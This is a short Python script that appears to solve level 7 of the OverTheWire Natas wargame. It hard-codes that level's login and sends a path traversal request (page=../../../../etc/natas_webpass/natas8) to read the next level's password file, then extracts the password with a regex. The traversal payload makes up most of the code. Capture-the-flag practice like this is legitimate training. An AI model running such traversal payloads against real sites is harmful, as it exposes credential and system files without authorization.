from bs4 import BeautifulSoup as bs
import requests
import re

u='natas7'
p='7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'
#l=f'http://{u}.natas.labs.overthewire.org/includes/secret.inc'
#l=f'http://{u}.natas.labs.overthewire.org/'
l=f'http://{u}.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8'
#resp=requests.post(l,data={"secret":"FOEIUWGHFEEUHOFUOIU","submit":"submit"},auth=(u, p))
resp=requests.post(l,auth=(u, p))
t=resp.text
print(re.findall(r'<br>\n(.*)\n\n',t)[0])
